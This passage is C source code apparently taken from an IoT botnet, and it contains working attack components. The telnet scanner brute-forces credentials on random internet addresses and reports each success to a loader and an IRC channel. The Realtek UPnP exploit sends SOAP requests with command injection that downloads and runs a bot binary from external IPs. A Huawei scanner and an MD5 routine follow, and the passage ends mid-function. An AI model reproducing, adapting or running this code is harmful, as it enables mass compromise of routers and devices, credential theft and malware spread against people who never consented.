                                report_working(conn->dst_addr, port_, conn->auth, sock);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}


void ak47telscan(int wait_usec, int maxfds, int sock) {
    if(!fork()) return;
    int i, res, num_tmps, j;
    char buf[128], cur_dir;
    int max = maxfds;
    fd_set fdset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    int scanSock;
    char line[256];
    char *buffer;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    buffer = malloc(BUFFER_SIZE + 1);
    memset(buffer, 0, BUFFER_SIZE + 1);

    struct telstate_t fds[max];

    memset(fds, 0, max * (sizeof(int) + 1));
    for (i = 0; i < max; i++) {
        memset(&(fds[i]), 0, sizeof(struct telstate_t));
        fds[i].complete = 1;
        fds[i].sockbuf = buffer;
    }

    while (1) {
        for (i = 0; i < max; i++) {
            if (fds[i].totalTimeout == 0) {
                fds[i].totalTimeout = time(NULL);
            }

            switch (fds[i].state) {
            case 0:
                {
                    if (fds[i].complete == 1) {
                        // clear the current fd
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                        // get a new random ip
                        fds[i].ip = getDatIP();
                    } else if (fds[i].complete == 0) {
                        fds[i].passwordInd++;
                        fds[i].usernameInd++;

                        if (fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                        if (fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                    }

                    dest_addr.sin_family = AF_INET;

					if(random_number(1, 10) == 10) {
						fds[i].port = 2323;
                    } else {
						fds[i].port = 23;
					}
										dest_addr.sin_port = htons(fds[i].port);

                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                    if (fds[i].fd == -1) continue;

                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
                        reset_telstate(&fds[i]);
                    } else {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
            case 1:
                {
//                    Send(sock, "PRIVMSG %s :[AK-47] FOUND ---> %s:23\n", CHAN, get_telstate_host(&fds[i]));
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd,&fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd + 1, NULL,&fdset, NULL,&tv);

                    if (res == 1) {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        //printf("%d\n",valopt);
                        if (valopt) {
                            reset_telstate(&fds[i]);
                        } else {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL)&(~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    } else if (res == -1) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (fds[i].totalTimeout + 5 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 2:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 3);
                        }

                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 3:
                {
                    if (send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    advance_telstate(&fds[i], 4);
                }
                break;

            case 4:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 3 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 5:
                {
                    if (send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                  //  Send(sock, "PRIVMSG %s :[AK-47] ATTEMPT ---> %s:23 %s:%s\n", CHAN, get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                    advance_telstate(&fds[i], 6);
                }
                break;

            case 6:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
                        fds[i].totalTimeout = time(NULL);
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else if (contains_success(fds[i].sockbuf)) {
                            if (fds[i].complete == 2) {
                                reset_telstate(&fds[i]);
                            } else {
                                scanSock = socket_connect(decode(SCANLISTENHOST), SCANLISTENPORT);
                                
                                    Send(scanSock, "%s:%u %s:%s\n", get_telstate_host(&fds[i]), fds[i].port, usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                    Send(sock, "PRIVMSG %s :[AK-47] [-] Sent to echoloader ---> %s:%u %s:%s\n", CHAN, get_telstate_host(&fds[i]), fds[i].port, usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                close(scanSock);
                                reset_telstate(&fds[i]);
                            }
                        } else {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            }
        }
    }
}


#define realtekscanner_SCANNER_MAX_CONNS 512
#define realtekscanner_SCANNER_RAW_PPS 720
#define realtekscanner_SCANNER_RDBUF_SIZE 1024
#define realtekscanner_SCANNER_HACK_DRAIN 64

struct realtekscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        realtekscanner_SC_CLOSED,
        realtekscanner_SC_CONNECTING,
        realtekscanner_SC_EXPLOIT_STAGE2,
        realtekscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[realtekscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};
int realtekscanner_scanner_pid = 0, realtekscanner_rsck = 0, realtekscanner_rsck_out = 0;
char realtekscanner_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct realtekscanner_scanner_connection *conn_table_r;
uint32_t realtekscanner_fake_time = 0;

int realtekscanner_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}


static ipv4_t realtekscanner_get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static void realtekscanner_setup_connection(struct realtekscanner_scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = realtekscanner_fake_time;

    if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2 || conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
    {
    }
    else
    {
        conn->state = realtekscanner_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}


void realtekscanner_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    realtekscanner_scanner_pid = fork();
    if(realtekscanner_scanner_pid > 0 || realtekscanner_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    realtekscanner_fake_time = time(NULL);
    conn_table_r = calloc(realtekscanner_SCANNER_MAX_CONNS, sizeof(struct realtekscanner_scanner_connection));
    for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
    {
        conn_table_r[i].state = realtekscanner_SC_CLOSED;
        conn_table_r[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if((realtekscanner_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[scanner] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(realtekscanner_rsck, F_SETFL, O_NONBLOCK | fcntl(realtekscanner_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(realtekscanner_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[scanner] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(realtekscanner_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)realtekscanner_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(52869);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

    #ifdef DEBUG
        printf("[scanner] scanner process initialized. scanning started.\n");
    #endif

    // Main logic loop
    while(1)
    {
        fd_set fdset_rd, fdset_wr;
        struct realtekscanner_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if(realtekscanner_fake_time != last_spew)
        {
            last_spew = realtekscanner_fake_time;

            for(i = 0; i < realtekscanner_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)realtekscanner_scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = realtekscanner_get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = htons(52869);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(realtekscanner_rsck, realtekscanner_scanner_rawpkt, sizeof(realtekscanner_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while(1)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct realtekscanner_scanner_connection *conn;

            errno = 0;
            n = recvfrom(realtekscanner_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(52869))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < realtekscanner_SCANNER_MAX_CONNS; n++)
            {
                if(conn_table_r[n].state == realtekscanner_SC_CLOSED)
                {
                    conn = &conn_table_r[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            realtekscanner_setup_connection(conn);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;

            conn = &conn_table_r[i];
            //timeout = (conn->state > realtekscanner_SC_CONNECTING ? 30 : 5);

            if(conn->state != realtekscanner_SC_CLOSED && (realtekscanner_fake_time - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = realtekscanner_SC_CLOSED;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                continue;
            }

            if(conn->state == realtekscanner_SC_CONNECTING || conn->state == realtekscanner_SC_EXPLOIT_STAGE2 || conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != realtekscanner_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        realtekscanner_fake_time = time(NULL);

        for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table_r[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d sending payload\n", conn->fd);
                        #endif

						
                        util_strcpy(conn->payload_buf, "POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://185.10.68.127/rtbin -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                        close(conn->fd);
                        realtekscanner_setup_connection(conn);
                        conn->state = realtekscanner_SC_EXPLOIT_STAGE3;

                        continue;
                    }
                    else if(conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d finnished\n", conn->fd);
                        #endif
						
                        util_strcpy(conn->payload_buf, "POST /wanipcn.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`wget http://45.145.185.229/bins/keksec.mips  -O faggXD; chmod 777 faggXD; ./faggXD`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = realtekscanner_SC_CLOSED;

                        continue;
                    }
                    else
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d connected to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        #endif

                        conn->state = realtekscanner_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = realtekscanner_SC_CLOSED;

                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(1)
                {
                    int ret = 0;

                    if(conn->state == realtekscanner_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == realtekscanner_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + realtekscanner_SCANNER_HACK_DRAIN, realtekscanner_SCANNER_RDBUF_SIZE - realtekscanner_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= realtekscanner_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = realtekscanner_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, realtekscanner_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                realtekscanner_setup_connection(conn);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = realtekscanner_SC_CLOSED;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = realtekscanner_fake_time;

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}



#define HUAWEI_SCANNER_MAX_CONNS 128
#define HUAWEI_SCANNER_RAW_PPS 1024

#define HUAWEI_SCANNER_RDBUF_SIZE 1024
#define HUAWEI_SCANNER_HACK_DRAIN 64
struct huawei_scanner_connection
{
    int fd, last_recv;
    enum
    {
        HUAWEI_SC_CLOSED,
        HUAWEI_SC_CONNECTING,
        HUAWEI_SC_GET_CREDENTIALS,
        HUAWEI_SC_EXPLOIT_STAGE2,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[HUAWEI_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560];
    char nonce_buf[2560];
	char nonce[33];
	char dst[16];
    int credential_index;
};

void huawei_init();

static void huawei_setup_connection(struct huawei_scanner_connection *);
static ipv4_t get_random_huawei_ip(void);

int huawei_scanner_pid = 0, huawei_rsck = 0, huawei_rsck_out = 0;
char huawei_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct huawei_scanner_connection *huawei_conn_table;
uint32_t huawei_fake_time = 0;

int huawei_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

static void huawei_setup_connection(struct huawei_scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, fcntl(conn->fd, F_GETFL, 0));
int v;
v = fcntl(conn->fd, F_GETFD, 0);
v |= O_NONBLOCK;
struct timeval tv;
tv.tv_sec = 1;
tv.tv_usec = 0;
setsockopt(conn->fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = huawei_fake_time;

    if(conn->state == HUAWEI_SC_EXPLOIT_STAGE2)
    {
    }
    else
    {
        conn->state = HUAWEI_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static ipv4_t get_random_huawei_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;

    do
    {
        tmp = rand_next();

		srand(time(NULL));
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    int randnum = rand() % 4;
    if (randnum == 0)
    {
        return INET_ADDR(157,o2,o3,o4);
    }
    if (randnum == 1)
    {
        return INET_ADDR(197,o2,o3,o4);
    }
	if (randnum == 2)
    {
        return INET_ADDR(41,o2,o3,o4);
    }
    else
    {
        return INET_ADDR(o1,o2,o3,o4);
    }
}
char * extract_between(const char *str, const char *p1, const char *p2)
{
  const char *i1 = strstr(str, p1);
  if(i1 != NULL)
  {
    const size_t pl1 = strlen(p1);
    const char *i2 = strstr(i1 + pl1, p2);
    if(p2 != NULL)
    {
     /* Found both markers, extract text. */
     const size_t mlen = i2 - (i1 + pl1);
     char *ret = malloc(mlen + 1);
     if(ret != NULL)
     {
       memcpy(ret, i1 + pl1, mlen);
       ret[mlen] = '\0';
       return ret;
     }
    }
  }
}

// Constants are the integer part of the sines of integers (in radians) * 2^32.
const uint32_t k[64] = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee ,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501 ,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be ,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821 ,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa ,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8 ,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed ,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a ,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c ,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70 ,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05 ,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665 ,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039 ,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1 ,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1 ,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
};

// r specifies the per-round shift amounts
const uint32_t r[] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                      5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
                      4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                      6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
                     };

// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))

void to_bytes(uint32_t val, uint8_t *bytes)
{
    bytes[0] = (uint8_t) val;
    bytes[1] = (uint8_t) (val >> 8);
    bytes[2] = (uint8_t) (val >> 16);
    bytes[3] = (uint8_t) (val >> 24);
}

uint32_t to_int32(const uint8_t *bytes)
{
    return (uint32_t) bytes[0]
           | ((uint32_t) bytes[1] << 8)
           | ((uint32_t) bytes[2] << 16)
           | ((uint32_t) bytes[3] << 24);
}

void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest)
{

    // These vars will contain the hash
    uint32_t h0, h1, h2, h3;

    // Message (to prepare)
    uint8_t *msg = NULL;

    size_t new_len, offset;
    uint32_t w[16];
    uint32_t a, b, c, d, i, f, g, temp;

    // Initialize variables - simple count in nibbles:
    h0 = 0x67452301;
    h1 = 0xefcdab89;
    h2 = 0x98badcfe;
    h3 = 0x10325476;

    //Pre-processing:
    //append "1" bit to message
    //append "0" bits until message length in bits ≡ 448 (mod 512)
    //append length mod (2^64) to message

    for (new_len = initial_len + 1; new_len % (512/8) != 448/8; new_len++)
        ;

    msg = malloc(new_len + 8);
